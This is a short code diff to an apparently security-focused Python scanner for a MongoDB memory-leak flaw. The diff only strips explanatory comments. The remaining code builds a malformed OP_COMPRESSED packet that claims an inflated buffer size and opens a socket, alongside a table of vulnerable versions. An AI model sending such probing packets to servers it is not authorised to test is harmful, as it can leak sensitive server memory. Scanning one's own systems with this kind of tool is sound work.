@@ -46,12 +46,12 @@ print_lock = Lock()
 
 
 VULNERABLE_VERSIONS = {
-    "8.2": (0, 2),      # 8.2.0 - 8.2.2 (fixed in 8.2.3)
-    "8.0": (0, 16),     # 8.0.0 - 8.0.16 (fixed in 8.0.17)
-    "7.0": (0, 27),     # 7.0.0 - 7.0.27 (fixed in 7.0.28)
-    "6.0": (0, 26),     # 6.0.0 - 6.0.26 (fixed in 6.0.27)
-    "5.0": (0, 31),     # 5.0.0 - 5.0.31 (fixed in 5.0.32)
-    "4.4": (0, 29),     # 4.4.0 - 4.4.29 (fixed in 4.4.30)
+    "8.2": (0, 2),      
+    "8.0": (0, 16),     
+    "7.0": (0, 27),     
+    "6.0": (0, 26),     
+    "5.0": (0, 31),     
+    "4.4": (0, 29),     
 }
 
 
@@ -72,16 +72,16 @@ class MongoBleedScanner:
             op_msg = struct.pack('<I', 0) + b'\x00' + bson
             compressed = zlib.compress(op_msg)
             
-            payload = struct.pack('<I', 2013)  # original opcode (OP_MSG)
-            payload += struct.pack('<i', buffer_size)  # claimed uncompressed size (INFLATED)
-            payload += struct.pack('B', 2)  # compressor ID: 2 = zlib
+            payload = struct.pack('<I', 2013)  
+            payload += struct.pack('<i', buffer_size)  
+            payload += struct.pack('B', 2)  
             payload += compressed
             
             header = struct.pack('<IIII', 
-                16 + len(payload),  # total message length (header + body)
-                1,                   # requestID
-                0,                   # responseTo
-                2012                 # opCode: OP_COMPRESSED
+                16 + len(payload),  
+                1,                   
+                0,                   
+                2012                
             )
             
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
